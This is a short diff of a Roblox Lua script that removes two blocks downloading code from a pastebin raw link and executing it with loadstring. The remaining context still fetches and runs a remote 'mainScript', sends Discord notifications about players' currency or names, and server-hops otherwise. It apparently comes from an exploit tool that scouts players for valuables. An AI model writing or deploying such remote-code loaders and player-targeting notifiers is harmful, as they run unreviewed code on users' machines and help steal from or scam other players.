@@ -385,10 +385,6 @@ if meetsMinimum then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
-	task.spawn(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
-	end)
-
 	DiscordNotificationCURRENCY(currencyTextLabel, temp)
 
 elseif nameFound then
@@ -404,14 +400,11 @@ elseif nameFound then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
-	task.spawn(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
-	end)
-
 	DiscordNotificationNAME(matchedName)
 else
 	Serverhop()
 end
+
 
 
 
